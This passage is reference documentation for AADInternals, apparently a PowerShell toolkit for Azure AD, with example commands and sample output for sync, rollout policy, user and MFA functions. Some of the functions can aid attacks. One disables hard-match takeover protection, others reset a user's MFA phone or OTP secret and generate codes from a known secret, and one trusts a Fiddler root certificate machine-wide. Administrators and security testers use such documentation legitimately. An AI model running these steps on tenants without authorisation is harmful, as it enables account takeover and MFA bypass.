EnableSoftMatchOnUpn                             : True
EnableUserForcePasswordChangeOnLogon             : False
EnforceCloudPasswordPolicyForPasswordSyncedUsers : False
PassThroughAuthentication                        : False
PasswordHashSync                                 : True
PasswordWriteBack                                : False
SynchronizeUpnForManagedUsers                    : True
UnifiedGroupWriteback                            : False
UserWriteback                                    : False
```

### Set-AADIntSyncFeatures (A)
Since version 0.6.7 <br>
Enables or disables synchronisation features using Azure AD Sync API. 
As such, doesn't require "Global Administrator" credentials, "Directory Synchronization Accounts" credentials will do.

**Example:**
{{< highlight powershell >}}
# Get access token
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Enable PHS and disable BlockCloudObjectTakeoverThroughHardMatch
Set-AADIntSyncFeature -EnableFeatures PasswordHashSync -DisableFeatures BlockCloudObjectTakeoverThroughHardMatch
{{< /highlight>}}
**Output:**
```
BlockCloudObjectTakeoverThroughHardMatch         : True
BlockSoftMatch                                   : False
DeviceWriteback                                  : False
DirectoryExtensions                              : False
DuplicateProxyAddressResiliency                  : True
DuplicateUPNResiliency                           : True
EnableSoftMatchOnUpn                             : True
EnableUserForcePasswordChangeOnLogon             : False
EnforceCloudPasswordPolicyForPasswordSyncedUsers : False
PassThroughAuthentication                        : False
PasswordHashSync                                 : True
PasswordWriteBack                                : False
SynchronizeUpnForManagedUsers                    : True
UnifiedGroupWriteback                            : False
UserWriteback                                    : False
```

### Get-AADIntTenantOrganisationInformation (AD)
Since version 0.6.7 <br>
Returns organisation information for the given tenant using commercial API used to get Partner Tenant information. Requires admin rights.

**Example:**
{{< highlight powershell >}}
# Get access token and store to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Get the tenant information
Get-AADIntTenantOrganisationInformation -Domain "company.com"
{{< /highlight>}}
**Output:**
```
TenantId         : 043050e2-7993-416a-ae66-108ab1951612
CompanyName      : Company Ltd
StreetAddress    : 10 Wall Street
ApartmentOrSuite : 666
City             : New York
StateOrProvince  : NY
PostalCode       : 10005
CountryCode      : US
PhoneNumber      : 
FirstName        : 
LastName         : 
```

## Rollout policy functions

**Rollout policy** functions allows manipulating rollout policies. You list, create, edit, and delete policies. You can also add or remove groups from policies.

When rollout policy is disabled from Azure Admin center, it still exists in Azure AD even though it is not visible. AADInternals allows you to list and delete also these policies.

### Get-AADIntRolloutPolicies (M)
Since version 0.4.5 <br>
Gets the tenant's rollout policies. Rollout policies allows organisations to transition from federation to cloud authentication in stages.
This function can be used to list rollout policies not visible in Azure Admin center. 

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

### Set-AADIntRolloutPolicy (M)
Since version 0.4.5 <br>
Creates a new rollout policy or edits existing one. Supported policy types are passwordHashSync (PHS), passthroughAuthentication (PTA), and seamlessSso (SSSO)

**Example 1:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Create a new PTA rollout policy
Set-AADIntRolloutPolicy -Policy passthroughAuthentication -Enable $true
{{< /highlight>}}

**Output:**
```
@odata.context          : https://graph.microsoft.com/beta/$metadata#directory/featureRolloutPolicies/$entity
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False
```

**Example 2:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

{{< highlight powershell >}}
# Disable PTA policy
Set-AADIntRolloutPolicy -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d -Enable $False
{{< /highlight>}}

### Remove-AADIntRolloutPolicy (M)
Since version 0.4.5 <br>
Removes the given rollout policy. The policy MUST be disabled before it can be removed. If not, it won't be removed but no error is given.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

{{< highlight powershell >}}
# Remove PTA policy
Remove-AADIntRolloutPolicy -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
{{< /highlight>}}

### Get-AADIntRolloutPolicyGroups (M)
Since version 0.4.5 <br>
Lists the groups of the given rollout policy.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

{{< highlight powershell >}}
# List the groups of PTA policy
Get-AADIntRolloutPolicyGroups -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
{{< /highlight>}}

**Output:**
```
displayName       id
-----------       --
PTA SSO Sales     b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3
PTA SSO Marketing f35d712f-dcdb-4040-a93d-ffd04aff3f75
```

### Add-AADIntRolloutPolicyGroups (M)
Since version 0.4.5 <br>
Adds given groups to the given rollout policy.

Return value meanings:

Status | Description
---    | ---
204    | The group successfully added
400    | Invalid group id
404    | Invalid policy id

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

{{< highlight powershell >}}
# Add two groups to the PTA policy
Add-AADIntRolloutPolicyGroups -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d -GroupIds b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3,f35d712f-dcdb-4040-a93d-ffd04aff3f75
{{< /highlight>}}

**Output:**
```
id                                   status
--                                   ------
b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3    204
f35d712f-dcdb-4040-a93d-ffd04aff3f75    204
```

### Remove-AADIntRolloutPolicyGroups (M)
Since version 0.4.5 <br>
Removes given groups from the given rollout policy.

Return value meanings:

Status | Description
---    | ---
204    | The group successfully added
400    | Invalid group id
404    | Invalid policy id

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# List the rollout policies
Get-AADIntRolloutPolicies
{{< /highlight>}}

**Output:**
```
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
```

{{< highlight powershell >}}
# List the groups of PTA policy
Get-AADIntRolloutPolicyGroups -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
{{< /highlight>}}

**Output:**
```
displayName       id
-----------       --
PTA SSO Sales     b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3
PTA SSO Marketing f35d712f-dcdb-4040-a93d-ffd04aff3f75
```

{{< highlight powershell >}}
# Remove "PTA SSO Sales" and "PTA SSO Marketing" groups from PTA policy
Remove-AADIntRolloutPolicyGroups -PolicyId cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d -GroupIds b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3,f35d712f-dcdb-4040-a93d-ffd04aff3f75
{{< /highlight>}}

**Output:**
```
id                                   status
--                                   ------
b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3    204
f35d712f-dcdb-4040-a93d-ffd04aff3f75    204
```

## Utilities

**Utilities** provide the functionality for troubleshooting etc.

### Read-AADIntAccesstoken (*)
This function show access (and id and refresh) token information. For debugging, the most important values are the audience (aud) and the issuer (iss).
Use -validate switch to validate the signature and to check the expiration.

You can also show details from the token copied from the browser session's **authorization** -header.

**Example1:**
{{< highlight powershell >}}
# Show access token information
$at = Get-AADIntAccessTokenForAADGraph
Read-AADIntAccesstoken $at
{{< /highlight>}}

**Output1:**
```
aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/fe177079-66f4-4f9f-bcb6-e085b92e3c8a/
iat                 : 1540478026
nbf                 : 1540478026
exp                 : 1540481926
acr                 : 1
aio                 : ASQA2/8JAAAAXhS3vMo2OGlXvBZG0tScm9njsJUDhvoHtwdSlUx2Jvg=
amr                 : {pwd}
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : demo
given_name          : admin
ipaddr              : 127.0.0.1
name                : admin demo
oid                 : 69be7da7-e29f-4753-b8c7-0417a63a1804
puid                : 1003BFFDABE606EE
scp                 : user_impersonation
sub                 : SaN7kFxdXhzQN6B7C8ThGEg4gBIrcXo3lzcayeoReps
tenant_region_scope : EU
tid                 : 6217f557-602d-4fc8-b2f9-5cb948f6ce26
unique_name         : admin@company.onmicrosoft.com
upn                 : admin@company.onmicrosoft.com
uti                 : bH3Bzy9D5ESLcW_S0KkoAA
ver                 : 1.0
```

**Example2:**
{{< highlight powershell >}}
# Show access token information
Read-AADIntAccesstoken $at -Validate
{{< /highlight>}}

**Output1:**
```
Read-Accesstoken : Access Token is expired
    At line:1 char:1
    + Read-Accesstoken -AccessToken $at -Validate -verbose
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
        + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Read-Accesstoken
		
aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/fe177079-66f4-4f9f-bcb6-e085b92e3c8a/
iat                 : 1540478026
nbf                 : 1540478026
exp                 : 1540481926
acr                 : 1
aio                 : ASQA2/8JAAAAXhS3vMo2OGlXvBZG0tScm9njsJUDhvoHtwdSlUx2Jvg=
amr                 : {pwd}
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : demo
given_name          : admin
ipaddr              : 127.0.0.1
name                : admin demo
oid                 : 69be7da7-e29f-4753-b8c7-0417a63a1804
puid                : 1003BFFDABE606EE
scp                 : user_impersonation
sub                 : SaN7kFxdXhzQN6B7C8ThGEg4gBIrcXo3lzcayeoReps
tenant_region_scope : EU
tid                 : 6217f557-602d-4fc8-b2f9-5cb948f6ce26
unique_name         : admin@company.onmicrosoft.com
upn                 : admin@company.onmicrosoft.com
uti                 : bH3Bzy9D5ESLcW_S0KkoAA
ver                 : 1.0
```

### Get-AADIntImmutableID (*)
This function returns ImmutableId for the given ADUser -object. Must be run on a computer having **ActiveDirectory** -module

**Example:**
{{< highlight powershell >}}
# Get ADUser object
$user=Get-ADUser "myuser"

# Get ImmutableId for the ADUser
Get-AADIntImmutableID -ADUser $user
{{< /highlight>}}

**Output:**
```
Zjk1OGUxZTctNDE4ZS00Njk5LTg1ZjgtN2YyNGM2NTcwNW==
```

### Start-AADIntCloudShell ( C)
Since version 0.4.3<br>
Starts an Azure Cloud Shell (PowerShell) session for the given user. Use **-shell bash** parameter to start Bash session.

**Note!** Does not work with VSCode or ISE.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForCloudShell -SaveToCache

# Start the cloud shell (PowerShell)
Start-AADIntCloudShell
{{< /highlight>}}

### Set-AADIntProxySettings
Since version 0.6.6<br>

Sets proxy settings of the local Windows machine for:

* .NET Framework (both 32 & 64 bit) by editing machine.config
* LocalSystem using BITSAdmin
* NetworkService using BITSAdmin
* winhttp using netsh
* Local user by modifying registry
* Machine level by modifying registry
* Force machine level proxy by modifying registry

Trusts Fiddler root certificate by importing it to Local Machine truster root certificates

**Example 1:**
{{< highlight powershell >}}
# Set proxy settings
Set-AADIntProxySettings -ProxyAddress 10.0.0.10:8080
{{< /highlight>}}
**Output:**
```
Setting proxies for x86 & x64 .NET Frameworks:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
Setting proxy for LocalSystem:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account LocalSystem were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to <empty>
Setting proxy for NetworkService:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account NetworkService were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to <empty>
Setting winhttp proxy:

Current WinHTTP proxy settings:

	Proxy Server(s) :  10.0.0.1:8080
	Bypass List     :  (none)

Setting the proxy of local user Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting the proxy of machine Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting machine level procy policy for Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings Property: ProxySettingsPerUser".
```

**Example 2:**
{{< highlight powershell >}}
# Set proxy settings and trust Fiddler root certificate
Set-AADIntProxySettings -ProxyAddress 10.0.0.10:8080 -TrustFiddler
{{< /highlight>}}
**Output:**
```
Setting proxies for x86 & x64 .NET Frameworks:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
Setting proxy for LocalSystem:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account LocalSystem were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to <empty>
Setting proxy for NetworkService:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account NetworkService were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to <empty>
Setting winhttp proxy:

Current WinHTTP proxy settings:

	Proxy Server(s) :  10.0.0.1:8080
	Bypass List     :  (none)

Setting the proxy of local user Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting the proxy of machine Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting machine level procy policy for Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings Property: ProxySettingsPerUser".
Trusting Fiddler root certificate:


   PSParentPath: Microsoft.PowerShell.Security\Certificate::LocalMachine\Root

Thumbprint                                Subject                                                              
----------                                -------                                                              
33D6FCEE2850DC53EEED517F3E8E72EB944BD467  CN=DO_NOT_TRUST_FiddlerRoot, O=DO_NOT_TRUST, OU=Created by http://...

```

## User manipulation

**User manipulation** functions provide the basic user adding/editing/deleting functionality and some extras.

### Get-AADIntUsers (A)
This function returns users of the tenant.

**Example:**
{{< highlight powershell >}}
# Get users
Get-AADIntUsers | Select UserPrincipalName,ObjectId,ImmutableId
{{< /highlight>}}

**Output:**
```
UserPrincipalName                                               ObjectId                             ImmutableId             
-----------------                                               --------                             -----------  
LeeG@company.com                                                2eee0a36-9e2f-4985-80e1-4172ed8b3213 7jYndBUFCEqlXQNZEO3uwQ==
LidiaH@company.com                                              34289155-2798-432d-9398-53e7e0918f38 W3clIieLs0ivUeoY1lu1fg==
AllanD@company.com                                              3a0eea57-9f74-4ee5-8e84-353c35581cc2 BzPotuy3G0ySBJN5tZwB4w==
```

### Get-AADIntUser (A)
This function returns information for the given user.

**Example:**
{{< highlight powershell >}}
# Get user information
Get-AADIntUser -UserPrincipalName "LeeG@company.com"
{{< /highlight>}}

**Output:**
```
AlternateEmailAddresses                : 
AlternateMobilePhones                  : 
AlternativeSecurityIds                 : 
BlockCredential                        : false
City                                   : 
CloudExchangeRecipientDisplayType      : 1073741824
Country                                : 
Department                             : Manufacturing
DirSyncProvisioningErrors              : 
DisplayName                            : Lee Gu
Errors                                 : 
Fax                                    : 
FirstName                              : Lee
ImmutableId                            : 7jYndBUFCEqlXQNZEO3uwQ==
IndirectLicenseErrors                  : 
IsBlackberryUser                       : false
IsLicensed                             : true
LastDirSyncTime                        : 2018-06-26T11:04:16Z
LastName                               : Gu
LastPasswordChangeTimestamp            : 2017-10-03T04:44:43Z
LicenseAssignmentDetails               : LicenseAssignmentDetails
LicenseReconciliationNeeded            : false
Licenses                               : Licenses
LiveId                                 : 1003BFFDABE61DB7
MSExchRecipientTypeDetails             : 
MSRtcSipDeploymentLocator              : 
MSRtcSipPrimaryUserAddress             : 
MobilePhone                            : 
OathTokenMetadata                      : 
ObjectId                               : 2eee0a36-9e2f-4985-80e1-4172ed8b3213
Office                                 : 23/3101
OverallProvisioningStatus              : PendingInput
PasswordNeverExpires                   : true
PasswordResetNotRequiredDuringActivate : true
PhoneNumber                            : +1 913 555 0101
PortalSettings                         : 
PostalCode                             : 66210
PreferredDataLocation                  : 
PreferredLanguage                      : 
ProxyAddresses                         : ProxyAddresses
ReleaseTrack                           : 
ServiceInformation                     : 
SignInName                             : LeeG@company.com
SoftDeletionTimestamp                  : 
State                                  : KS
StreetAddress                          : 10801 Mastin Blvd., Suite 620
StrongAuthenticationMethods            : 
StrongAuthenticationPhoneAppDetails    : 
StrongAuthenticationProofupTime        : 
StrongAuthenticationRequirements       : 
StrongAuthenticationUserDetails        : 
StrongPasswordRequired                 : true
StsRefreshTokensValidFrom              : 2017-10-03T04:44:43Z
Title                                  : Director
UsageLocation                          : FI
UserLandingPageIdentifierForO365Shell  : 
UserPrincipalName                      : LeeG@company.com
UserThemeIdentifierForO365Shell        : 
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 2018-06-26T11:04:14Z
```

### New-AADIntUser (A)
This function creates a new user. **Currently supports only UserPrincipalName and DisplayName**.

**Example:**
{{< highlight powershell >}}
# Get login information for a domain
New-AADIntUser -UserPrincipalName "user@company.com" -DisplayName "New User"
{{< /highlight>}}

**Output:**
```
AlternateEmailAddresses                : 
AlternateMobilePhones                  : 
AlternativeSecurityIds                 : 
BlockCredential                        : false
City                                   : 
CloudExchangeRecipientDisplayType      : 
Country                                : 
Department                             : 
DirSyncProvisioningErrors              : 
DisplayName                            : New User
Errors                                 : 
Fax                                    : 
FirstName                              : 
ImmutableId                            : 
IndirectLicenseErrors                  : 
IsBlackberryUser                       : false
IsLicensed                             : false
LastDirSyncTime                        : 
LastName                               : 
LastPasswordChangeTimestamp            : 2018-10-25T15:13:10.8686574Z
LicenseAssignmentDetails               : 
LicenseReconciliationNeeded            : false
Licenses                               : 
LiveId                                 : 1003BFFDAEE167C0
MSExchRecipientTypeDetails             : 
MSRtcSipDeploymentLocator              : 
MSRtcSipPrimaryUserAddress             : 
MobilePhone                            : 
OathTokenMetadata                      : 
ObjectId                               : 13e121db-4132-43c8-a784-a9b12f2bd4e3
Office                                 : 
OverallProvisioningStatus              : None
PasswordNeverExpires                   : false
PasswordResetNotRequiredDuringActivate : 
PhoneNumber                            : 
PortalSettings                         : 
PostalCode                             : 
PreferredDataLocation                  : 
PreferredLanguage                      : 
ProxyAddresses                         : 
ReleaseTrack                           : 
ServiceInformation                     : 
SignInName                             : new.user@company.com
SoftDeletionTimestamp                  : 
State                                  : 
StreetAddress                          : 
StrongAuthenticationMethods            : 
StrongAuthenticationPhoneAppDetails    : 
StrongAuthenticationProofupTime        : 
StrongAuthenticationRequirements       : 
StrongAuthenticationUserDetails        : 
StrongPasswordRequired                 : true
StsRefreshTokensValidFrom              : 2018-10-25T15:13:10.8686574Z
Title                                  : 
UsageLocation                          : 
UserLandingPageIdentifierForO365Shell  : 
UserPrincipalName                      : new.user@company.com
UserThemeIdentifierForO365Shell        : 
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 
Password                               : Tog59451
```

### Set-AADIntUser (A)
This function changes user's information.

**Example:**
{{< highlight powershell >}}
# Set user information
Set-AADIntUser -UserPrincipalName "user@company.com" -FirstName "Dave"
{{< /highlight>}}

### Remove-AADIntUser (A)
This function removes a user.

**Example:**
{{< highlight powershell >}}
# Remove the user
Remove-AADIntUser -UserPrincipalName "user@company.com"
{{< /highlight>}}

### Get-AADIntGlobalAdmins (A)
This function returns all Global Admins of the tenant.

**Example:**
{{< highlight powershell >}}
# Get global admins
Get-AADIntGlobalAdmins
{{< /highlight>}}

**Output:**
```
DisplayName    UserPrincipalName                 
-----------    -----------------                 
admin demo     admin@company.onmicrosoft.com
Dave the Admin dave@company.com            
```
## User MFA manipulation

### Get-AADIntUserMFA (A)
Since version 0.2.8 <br>
Gets user's MFA settings

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -SaveToCache
    
# Get user's MFA settings 
Get-AADIntUserMFA -UserPrincipalName "user@company.com"
{{< /highlight>}}

**Output:**
```
UserPrincipalName      : user@company.com
State                  : Enforced
PhoneNumber            : +1 123456789
AlternativePhoneNumber : +358 123456789
Email                  : someone@hotmail.com
DefaultMethod          : OneWaySMS
Pin                    : 
OldPin                 : 
StartTime              :          
```

### Set-AADIntUserMFA (A)
Since version 0.2.8 <br>
Sets user's MFA settings

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -SaveToCache
    
# Set user's MFA settings 
Set-AADIntUserMFA -UserPrincipalName "user@company.com" -PhoneNumber "+1 123456789" -DefaultMethod PhoneAppNotification
{{< /highlight>}}

### Get-AADIntUserMFAApps (A)
Since version 0.4.0 <br>
Gets user's MFA Authentication App settings

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -SaveToCache
    
# Get user's MFA apps settings 
Get-AADIntUserMFAApps -UserPrincipalName "user@company.com"
{{< /highlight>}}

**Output:**
```
AuthenticationType : Notification, OTP
DeviceName         : SM-R2D2
DeviceTag          : SoftwareTokenActivated
DeviceToken        : APA91...
Id                 : 454b8d53-d97e-4ead-a69c-724166394334
NotificationType   : GCM
OathTokenTimeDrift : 0
OathSecretKey      :
PhoneAppVersion    : 6.2001.0140
TimeInterval       :

AuthenticationType : OTP
DeviceName         : NO_DEVICE
DeviceTag          : SoftwareTokenActivated
DeviceToken        : NO_DEVICE_TOKEN
Id                 : aba89d77-0a69-43fa-9e5d-6f41c7b9bb16
NotificationType   : Invalid
OathTokenTimeDrift : 0
OathSecretKey      :
PhoneAppVersion    : NO_PHONE_APP_VERSION
TimeInterval       :         
```

### Set-AADIntUserMFAApps (A)
Since version 0.4.0 <br>
Sets user's MFA Authentication App settings.

**Example:**
{{< highlight powershell >}}
# Set user's MFA apps settings 
Set-AADIntUserMFAApps -UserPrincipalName "user@company.com" -Id 454b8d53-d97e-4ead-a69c-724166394334 -DeviceName "SM-3CPO"
{{< /highlight>}}

### Register-AADIntMFAApp (MY)
Since version 0.4.0 <br>
Registers AADInternals Authenticator App or OTP appfor the user.

Requirements for App:

* AADInternals Authentication app is installed.
* Device Token is copied from the app.
* The user have registered at least one MFA method, e.g. SMS. This is because Access Token creation performs MFA.
* Registration is done through https://mysignins.microsoft.com so "Users can use the combined security information registration experience" MUST be activated for the tenant.

**Example1:**
{{< highlight powershell >}}
# Save the Device Token of AADInternals Authentication app to a variable
$deviceToken = "APA91bEGIvk1CCg1VIj_YQ_L8fn59UD6...mvXYxlWM6s90_Ct_fpo7iE3uF8hTb"

# Get the access token
Get-AADIntAccessTokenForMySignins -SaveToCache

# Register the new app
Register-AADIntMFAApp -DeviceToken -$deviceToken -DeviceName "My MFA App" -Type APP
{{< /highlight>}}
**Output:**
```
DefaultMethodOptions : 1
DefaultMethod        : 0
Username             : user@company.com
TenantId             : 9a79b12c-f563-4bdc-9d18-6e6d0d52f73b
AzureObjectId        : dce60ee2-d907-4478-9f36-de3d74708381
ConfirmationCode     : 1481770594613653
OathTokenSecretKey   : dzv5osvdx6dhtly4av2apcts32eqh4bg
OathTokenEnabled     : true
```

**Example2:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMySignins -SaveToCache

# Register the new OTP
Register-AADIntMFAApp -Type OTP
{{< /highlight>}}
**Output:**
```
OathSecretKey    DefaultMethodOptions DefaultMethod
-------------    -------------------- -------------
5bhbqsrb6ft5rxdx                    1             0
```

### New-AADIntOTPSecret
Since version 0.4.0 <br>
Generates a one-time-password (OTP) secret which can be used to reset user's OathSecretKey.

**Note!** Set only to "apps" which AuthenticationType is OTP!

**Example 1:**
{{< highlight powershell >}}
# Generate a new OTP secret 
New-AADIntOTPSecret
{{< /highlight>}}
**Output:**
```
njny7gdb6tnfihy3
```
{{< highlight powershell >}}
# Change the user's OathSecretKey 
Set-AADIntUserMFAApps -UserPrincipalName "user@company.com" -Id aba89d77-0a69-43fa-9e5d-6f41c7b9bb16 -OathSecretKey "njny7gdb6tnfihy3"
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Generate OTP secret 
New-AADIntOTPSecret -Clipboard
{{< /highlight>}}
**Output**
```
OTP secret copied to clipboard.
```

### New-AADIntOTP
Since version 0.4.0 <br>
Generates a one-time-password (OTP) using the given secret. Can be used for MFA if the user's secret is known.

**Example 1:**
{{< highlight powershell >}}
# Generate OTP 
New-AADIntOTP -SecretKey "rrc2 wntz dkbu iikb"
{{< /highlight>}}
**Output:**
```
OTP     Valid
---     -----
502 109 26s
```

**Example 2:**
{{< highlight powershell >}}
# Generate OTP 
New-AADIntOTP -SecretKey "rrc2 wntz dkbu iikb" -Clipboard
{{< /highlight>}}
**Output:**
```
OTP copied to clipboard, valid for 26s
```

## User manipulation with AD sync api

These functions provide some functionality allowing manipulation of Azure AD objects otherwise impossible.

**NOTE!** these function uses Azure AD synchronization API and may cause severe harm to the tenant!! **USE ON YOUR OWN RISK!**

### Get-AADIntSyncObjects (A)
This function returns all Azure AD objects that are not synced to the on-premises AD. 

**Example:**
{{< highlight powershell >}}
# Get synchronisable objects from AAD
Get-AADIntSyncObjects | Select UserPrincipalName
{{< /highlight>}}

**Output:**
```
UserPrincipalName          
-----------------          
BrianJ@company.com            
LynneR@company.com                        
MiriamG@company.com                       
AllanD@company.com                        
IsaiahL@company.com               
```

### Set-AADIntAzureADObject (A)
This function creates new OR modifies existing Azure AD object. 

Allows setting all Azure AD attributes. The **sourceAnchor** attribute is the most important one and is automatically set only to synced users.
This is typically the ImmutableID (Base64 encoded on-prem AD object's GUID), but can be any string that is unique tenant wide.


**Example:**
{{< highlight powershell >}}
# Create a new user
Set-AADIntAzureADObject -userPrincipalName "someone@company.com" -sourceAnchor "ABC" -netBiosName
{{< /highlight>}}

**Output:**
```
